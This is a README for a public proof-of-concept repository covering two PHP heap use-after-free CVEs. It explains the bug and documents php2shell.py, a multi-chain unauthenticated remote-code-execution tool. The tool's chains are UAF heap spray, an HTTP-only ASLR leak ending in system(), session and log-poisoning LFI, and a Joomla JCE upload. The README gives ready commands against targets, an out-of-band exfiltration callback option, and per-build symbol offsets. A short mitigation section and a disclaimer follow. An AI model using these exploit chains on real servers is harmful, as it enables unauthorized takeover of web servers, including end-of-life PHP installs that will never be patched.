# CVE-2026-109618 / CVE-2026-109619 — PHP2Shell PoC

> **Critical PHP Heap Use-After-Free — CVSS 9.2**  
> Affects PHP 5.x through 8.x (PHP 7.4 is EOL — no patch will ever be released)

## Overview

**PHP2Shell** is the name given to two heap use-after-free vulnerabilities in PHP core
patched on October 21, 2026.

| CVE | Component | Trigger |
|-----|-----------|---------|
| CVE-2026-109618 | `session.upload_progress` handler (rfc1867) | Requires `session.upload_progress.enabled = On` (default since PHP 5.4) |
| CVE-2026-109619 | Multipart parser | Any `multipart/form-data` POST — no session required |

Both are rated **CVSS 9.2** and affect unauthenticated attackers on any PHP installation
serving multipart requests.

## How It Works

### Root Cause

The `rfc1867` upload-progress handler in `ext/session/session.c` caches raw C pointers
into the live session HashTable:

```c
/* session.c — simplified */
zend_string *key = zend_string_init(UPLOAD_PROGRESS_PREFIX, ...);
zend_hash_update(Z_ARRVAL_P(progress), key, &val);   // ← pointer cached
```

When a **concurrent request** with the same `PHPSESSID` calls `session_start()`,
the session module reinitializes — **freeing the old HashTable** — while the
upload-progress handler still holds raw pointers into it.

Any further `FILE_DATA` write events go through those **stale (dangling) pointers**
into freed memory: a classic heap use-after-free write primitive.

```
Thread A (upload)          Thread B (session reinit)
─────────────────          ──────────────────────────
chunk-1 → primes pointer   
                           session_start() →
                             ht_free(session_ht)   ← HashTable freed
chunk-2 → writes through
          dangling ptr     ← UAF write into freed memory
```

### CVE-2026-109619 — Multipart Parser

A second UAF sits in the multipart parser itself (`main/rfc1867.c`).
It fires for **every** `multipart/form-data` POST — session handling not required.
This makes it reachable against any PHP endpoint, including login forms,
file upload handlers, and REST APIs.

---

## php2shell.py — Multi-chain RCE Exploit

`php2shell.py` is a comprehensive exploit tool that automatically selects the best
attack chain for a given target.

### Chains

| Chain | Technique | Requirements |
|-------|-----------|--------------|
| `uaf` | Heap UAF spray (precise or blind) | `session.upload_progress.enabled=On` |
| `aslr-leak` | HTTP-only ASLR bypass: heap + libphp pointer leak → precise UAF | PHP 8.x prefork mod_php, `display_errors=On`, `memory_limit=8M` |
| `session-lfi` | Session upload_progress poison → LFI file include | upload_progress + LFI param on target |
| `log-poison` | User-Agent PHP inject → Apache access log → LFI include | Apache access log readable via LFI |
| `jce` | CVE-2026-48907: JCE <= 2.9.99.4 unauthenticated file upload | Joomla with JCE plugin installed |
| `auto` | Probes target and tries best chain (default) | — |

### Usage

```bash
# Auto-detect best chain (recommended)
python3 php2shell.py target.com 443 / "id"

# UAF — precise mode with known zval_ptr_dtor address
python3 php2shell.py target.com 443 / "id" --chain uaf --dtor 0x7f1234abcd --ver 8.2

# UAF — blind spray (tries 30 candidate heap bases)
python3 php2shell.py target.com 443 / "id" --chain uaf --blind --retry 30 --ver 7.4

# ASLR-HTTP-Leak — HTTP-only 3-stage ASLR bypass (PHP 8.x)
# Stage 0: worker rotation; Stage 1: chunk base leak; Stage 2: libphp base leak; Stage 3: RCE
python3 php2shell.py target.com 443 / "id" --chain aslr-leak --ver 8.4

# Session-LFI — session file poison + LFI discovery
python3 php2shell.py target.com 443 / "id" --chain session-lfi

# Log-poison — Apache access log + LFI
python3 php2shell.py target.com 80 / "id" --chain log-poison

# JCE — Joomla unauthenticated RCE (CVE-2026-48907)
python3 php2shell.py joomla.target.com 443 / "id" --chain jce

# OOB exfil (for blind environments)
python3 php2shell.py target.com 443 / "id" --blind --oob https://your.callback.com
```

### ASLR-Leak Chain (PHP 8.x)

Three multipart POST requests, pure HTTP, no local access required:

| Stage | Request | Output |
|-------|---------|--------|
| 0 | OOM field flood (3000 × 1 KB) | Worker SIGABRT → fresh address space |
| 1 | 841 × 8-byte fields | `Set-Cookie` leaks Zend MM chunk base |
| 2 | Nested array `a406[0..15]` | `Set-Cookie` leaks libphp.so base (via `pDestructor=ZVAL_PTR_DTOR`) |
| 3 | Fake HashTable at `chunk+htdata_offset`, `pDestructor=zif_system` | `system(cmd)` fires |

Credit: technique from [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
and [3em0/php2shell](https://github.com/3em0/php2shell).

### Per-version Symbol Deltas (UAF chain)

The UAF chain calculates `zend_call_function = zval_ptr_dtor - delta`.
Known deltas (verified on live targets):

| Build | Delta |
|-------|-------|
| PHP 8.5 Ubuntu | `0x43EF0` |
| PHP 8.2 Bookworm | `0xc930` |
| PHP 8.2 Noble/Jammy | `0xcef0` / `0xd060` |
| PHP 8.1 Jammy | `0xc750` |
| PHP 7.4 CentOS 7 | `0x36e80` |
| PHP 7.4 Debian | `0x37f40` |
| PHP 7.4 Ubuntu | `0x38a60` |

---

## splat.py — Crash Demonstration (CVE-2026-109618)

Demonstrates the UAF crash primitive without RCE payload.

```bash
python3 splat.py <host> <port> <path> [stall_seconds]

# HTTPS target
python3 splat.py target.example.com 443 /index.php 0.35
```

Expected output on a vulnerable target: `HTTP/1.1 503` (worker crash, auto-recovered).

---

## Affected Versions

| Branch | Vulnerable | Patched |
|--------|-----------|---------|
| PHP 8.3 | < 8.3.x+1 | 8.3.x+1 (2026-10-21) |
| PHP 8.2 | < 8.2.x+1 | 8.2.x+1 (2026-10-21) |
| PHP 8.1 | < 8.1.x+1 | 8.1.x+1 (2026-10-21) |
| PHP 7.4 | ALL | **EOL — no patch ever** |
| PHP 5.x | ALL | **EOL — no patch ever** |

## Mitigation

**Patch (preferred):** Upgrade to the October 21 2026 PHP releases.

**Temporary workarounds:**

```ini
; php.ini — disables CVE-2026-109618 vector only
session.upload_progress.enabled = Off
```

For CVE-2026-109619 (multipart parser), the only real fix is patching.
At the web server level, blocking `Content-Type: multipart/form-data` for
endpoints that don't need file uploads reduces attack surface but is not
a complete mitigation.

## Disclaimer

This PoC is published for **educational and authorized security testing** only.
Unauthorized use against systems you do not own or have explicit written permission
to test is illegal. The crash induced by `splat.py` causes a single PHP-FPM worker
to die; PHP-FPM restarts it automatically.

## References

- [Sansec — PHP2Shell research](https://sansec.io/research/php2shell)
- [watchTowr — CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [SecurityWeek — Mass exploitation risk](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
- [Tenable — CVE-2026-109618](https://www.tenable.com/cve/CVE-2026-109618)
- [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) — HTTP-only ASLR bypass technique
- [3em0/php2shell](https://github.com/3em0/php2shell) — multi-version profiles
- [Sol0-dev/php2shell](https://github.com/Sol0-dev/php2shell) — session/log LFI chains
